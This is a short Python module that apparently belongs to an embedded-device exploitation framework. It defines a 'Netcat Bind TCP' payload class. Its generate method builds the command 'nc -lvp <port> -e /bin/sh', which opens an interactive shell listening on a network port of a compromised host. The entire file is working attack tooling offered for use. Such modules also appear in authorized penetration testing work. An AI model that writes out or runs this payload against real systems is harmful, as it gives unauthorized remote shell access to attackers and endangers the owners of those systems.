from embedxpl.core.exploit import *
from embedxpl.core.exploit.payloads import BindTCPPayloadMixin, GenericPayload


class Payload(BindTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Netcat Bind TCP",
        "description": "Creates interactive tcp bind shell by using netcat.",
        "authors": (
            "Marcin Bury",
            "André Henrique (@mrhenrike)",
        ),
    }

    cmd = OptString("nc", "Netcat binary")
    shell_binary = OptString("/bin/sh", "Shell")

    def generate(self):
        return f"{self.cmd} -lvp {self.rport} -e {self.shell_binary}"
